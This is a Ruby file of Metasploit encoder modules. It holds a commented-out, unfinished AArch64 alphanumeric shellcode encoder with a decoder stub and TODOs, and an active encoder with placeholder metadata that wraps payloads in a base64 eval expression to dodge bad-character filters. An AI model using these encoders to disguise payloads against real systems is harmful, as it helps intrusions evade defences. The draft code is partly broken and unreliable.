# require 'msf/core'
# ##
# # This module requires Metasploit: https://metasploit.com/download
# # Current source: https://github.com/rapid7/metasploit-framework
# ##
# 
# class MetasploitModule < Msf::Encoder
#   Rank = GreatRanking
# 
#   def initialize
#     super(
#       'Name' => 'AArch64 XOR Encoder',
#       'Description' => %q{
#         Encodes all characters in a shell code into alphanumeric code. Algorithm inspired by the paper "Shell codes from A to Z"
#       },
#       'Author' => 'A5t4t1ne',
#       'Arch' => ARCH_AARCH64,
#       'License' => MSF_LICENSE
#     )
#   end
# 
#   def encode_block(state, buf)
#     # encode the payload
# 
#     # puts(buf)
#     # puts(buf.length)
# 
#     p = buf
#     # b = 0x60 # Synchronize with pool
#     s = ' ' * buf.length * 4 * 2 # TODO: is length adjustment right?
# 
#     for i in 0...p.length do
#       q = p[i].ord
#       s[2 * i] = mkchr((q >> 4) & 0xF)
#       s[2 * i + 1] = mkchr(q & 0xF)
#     end
# 
#     s.gsub('@', 'P')
# 
#     puts(decode_stub(state, s))
#     return decode_stub(state, buf) + s
#   end
# 
#   def decode_stub(_state, encoded_payload)
#     # Generate the decoder stub
# 
#     jump_back_offsets = [
#       ['aaV7', 0xfffffffffffffc18],
#       ['aaV6', 0xfffffffffffffc14],
#       ['aao7', 0xfffffffffffffb18],
#       ['aao6', 0xfffffffffffffb14],
#       ['abT7', 0xfffffffffffffa38],
#       ['abT6', 0xfffffffffffffa34],
#       ['abm7', 0xfffffffffffff938],
#       ['abm6', 0xfffffffffffff934],
#       ['aaN7', 0xfffffffffffff418],
#       ['aaN6', 0xfffffffffffff414],
#       ['aag7', 0xfffffffffffff318],
#       ['aag6', 0xfffffffffffff314],
#       ['abL7', 0xfffffffffffff238],
#       ['abL6', 0xfffffffffffff234],
#       ['abe7', 0xfffffffffffff138],
#       ['abe6', 0xfffffffffffff134],
#       ['aaF7', 0xffffffffffffec18],
#       ['aaF6', 0xffffffffffffec14],
#       ['abD7', 0xffffffffffffea38],
#       ['abD6', 0xffffffffffffea34],
#       ['aa57', 0xffffffffffffe618],
#       ['aa56', 0xffffffffffffe614],
#       ['aav7', 0xffffffffffffe218],
#       ['aav6', 0xffffffffffffe214],
#       ['abt7', 0xffffffffffffe038],
#       ['abt6', 0xffffffffffffe034],
#       ['aaU7', 0xffffffffffffdb18],
#       ['aaU6', 0xffffffffffffdb14],
#       ['aan7', 0xffffffffffffda18],
#       ['aan6', 0xffffffffffffda14],
#       ['abl7', 0xffffffffffffd838],
#       ['abl6', 0xffffffffffffd834],
#       ['aaM7', 0xffffffffffffd318],
#       ['aaM6', 0xffffffffffffd314],
#       ['aaf7', 0xffffffffffffd218],
#       ['aaf6', 0xffffffffffffd214],
#       ['abd7', 0xffffffffffffd038],
#       ['abd6', 0xffffffffffffd034],
#       ['aaE7', 0xffffffffffffcb18],
#       ['aaE6', 0xffffffffffffcb14],
#       ['aa47', 0xffffffffffffc518],
#       ['aa46', 0xffffffffffffc514],
#       ['aau7', 0xffffffffffffc118],
#       ['aau6', 0xffffffffffffc114],
#       ['aaT7', 0xffffffffffffba18],
#       ['aaT6', 0xffffffffffffba14],
#       ['aam7', 0xffffffffffffb918],
#       ['aam6', 0xffffffffffffb914],
#       ['aaL7', 0xffffffffffffb218],
#       ['aaL6', 0xffffffffffffb214],
#       ['aae7', 0xffffffffffffb118],
#       ['aae6', 0xffffffffffffb114],
#       ['aaD7', 0xffffffffffffaa18],
#       ['aaD6', 0xffffffffffffaa14],
#       ['aat7', 0xffffffffffffa018],
#       ['aat6', 0xffffffffffffa014],
#       ['aal7', 0xffffffffffff9818],
#       ['aal6', 0xffffffffffff9814],
#       ['aad7', 0xffffffffffff9018],
#       ['aad6', 0xffffffffffff9014]
#     ]
# 
#     jump_back = 0
#     for val in jump_back_offsets
#       if buf.size < val[1]
#         jump_back = val[0]
#         nops = val[1] - buf.size - 4
#       end
#     end
# 
#     nops /= 4
# 
#     return 'jiL0' + # l1: adr x10, l1 + 0x98D2D
#            'JaBq' + # subs	w10, w10, #0x98, lsl #12
#            'Je4q' + # subs	w10, w10, #0xd19
#            'KbL0' + # l2: adr x11, l2+0b010011000110001001001
#            'kaBq' + # subs	w11, w11, #0x98, lsl #12
#            'kM91' + # adds	w11, w11, #0xe53
#            'k121' + # adds	w11, w11, #0xc8c
#            'sBSj' + # ands	w19, w19, w19, lsr #16
#            'sBSj' + # ands	w19, w19, w19, lsr #16
#            'b2Sj' + # ands	w2, w19, w19, lsr #12
#            'b8Y7' + # loop: tbnz W2, #11, 0x270C - TODO: adjust based on payload size
#            'R1A9' + # ldrb	w18, [x10, #76]
#            'Y5A9' + # ldrb	w25, [x10, #77]
#            'Jm01' + # adds	w10, w10, #0xc1b
#            'Je0q' + # subs	w10, w10, #0xc19
#            'rR2J' + # eon	w18, w19, w18, lsl #20
#            '9O0r' + # .word 0x72304C00 +33*25 
#            '9CrJ' + # eon	w25, w25, w18, lsr #16
#            'yI38' + # strb	w25, [x11, w19, uxtw]
#            'ki01' + # adds	w11, w11, #0xc1a
#            'ke0q' + # subs	w11, w11, #0xc19
#            'Bh01' + # adds	w2, w2, #0xc1a
#            'Bd0q' + # subs	w2, w2, #0xc19
#            'szH6' + # TODO: tbz w19, #9, <to lbl 'next'> - adjust based on jmp size
#            encoded_payload +
#            'JHMB' * nops +
#            jump_back # tbx w19, #9, <to lbl 'loop'>
#   end
# 
#   def mkchr(ch)
#     if ch == 0
#       c = 0x50
#     else
#       c = 0x40 + ch
#     end
#     return(c.chr) # c will always be between 0x41 ('A') and 0x50 ('P')
#   end
# 
# end


class MetasploitModule < Msf::Encoder
  Rank = GreatRanking

  def initialize
    super(
      'Name'             => 'Jaja',
      'Description'      => %q{
      okok
      },
      'Author'           => 'asdfasdf',
      'License'          => BSD_LICENSE,
      'Arch'             => ARCH_RUBY)
  end

  def encode_block(state, buf)
    %w{( ) . % e v a l u n p c k m 0 f i r s t}.each do |c|
      raise BadcharError if state.badchars.include?(c)
    end

    b64 = Rex::Text.encode_base64(buf)

    state.badchars.each_byte do |byte|
      raise BadcharError if b64.include?(byte.chr)
    end

    return "eval(%(" + b64 + ").unpack(%(m0)).first)"
  end
end
